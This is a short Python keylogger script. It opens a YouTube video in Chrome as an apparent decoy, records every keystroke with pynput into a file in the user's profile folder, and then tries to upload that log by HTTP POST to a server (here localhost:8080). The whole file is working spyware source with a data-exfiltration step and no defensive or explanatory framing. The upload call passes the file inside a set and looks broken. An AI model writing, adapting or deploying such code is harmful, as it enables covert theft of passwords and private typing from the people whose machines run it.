import webbrowser
import os
from pynput.keyboard import Key, Listener
import logging
import requests


url = 'https://youtu.be/fJ0kewOCD0Q?t=30'
chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'


webbrowser.get(chrome_path).open(url)

log_dir = ""

logging.basicConfig(filename=(log_dir + os.environ['USERPROFILE'] + '/kelogged.txt'), 
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

    fileurl = 'http://localhost:8080/'
    files = {open(os.environ['USERPROFILE'] + '/kelogged.txt', 'rb')}
    r = requests.post(fileurl, files=files)
    r.text

